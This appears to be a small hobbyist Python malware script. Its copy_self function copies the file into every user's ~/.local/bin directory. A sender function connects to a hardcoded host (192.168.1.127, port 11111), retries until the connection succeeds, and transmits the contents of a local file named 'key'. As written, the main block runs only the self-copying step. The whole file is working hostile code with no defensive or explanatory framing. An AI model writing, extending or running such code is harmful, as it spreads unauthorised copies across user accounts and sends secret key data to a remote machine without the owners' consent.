from socket import socket, gethostname
from os import makedirs,listdir
from os.path import dirname, exists
from pathlib import Path
from shutil import move,copy
from time import sleep

port=11111
host='192.168.1.127'


sock=socket()
def copy_self():
    for each in listdir('/home/'):
        pth='/home/'+each+'/.local/bin'
        try:
            makedirs(pth,exist_ok=True)
            copy(__file__,pth)
        except PermissionError:
            pass

def connector():
    try:
        sock.connect((host, port)) #again, this requires a tuple
    except ConnectionRefusedError:
        sleep(5)
        connector()
        
def sender():
    connector()
    while True:
        sock.send(b"Hello. File starts now\n")
        sock.send(b"--------------------------------------------------------------\n")

        with open('key','r') as f:
            data=f.read().encode('utf-8')
        sock.send(data)
    
        sock.send(b"\n--------------------------------------------------------------")
        sock.send(b"\nFile Complete\n")
        print("Sending complete")
        break

    sock.shutdown(1)

    sock.close()


if __name__=='__main__':
    copy_self()


        






